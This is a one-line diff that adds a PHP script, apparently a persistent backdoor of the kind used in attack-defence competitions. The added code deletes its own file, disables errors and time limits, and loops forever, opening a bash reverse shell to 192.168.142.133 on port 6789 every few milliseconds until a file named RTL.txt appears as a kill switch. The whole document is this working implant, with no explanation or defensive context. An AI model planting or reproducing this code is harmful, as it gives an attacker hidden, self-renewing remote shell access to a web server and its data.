@@ -1,0 +1,1 @@
+<?php @unlink(\$_SERVER['SCRIPT_FILENAME']);error_reporting(0);ignore_user_abort(true);set_time_limit(0);\$js = 'RTL.txt';while(1==1){if(file_exists(\$js)){@unlink(\$js);exit();}else{exec(\"/bin/bash -c '/bin/sh -i >&/dev/tcp/192.168.142.133/6789 0>&1'\");usleep(5000);}};?>
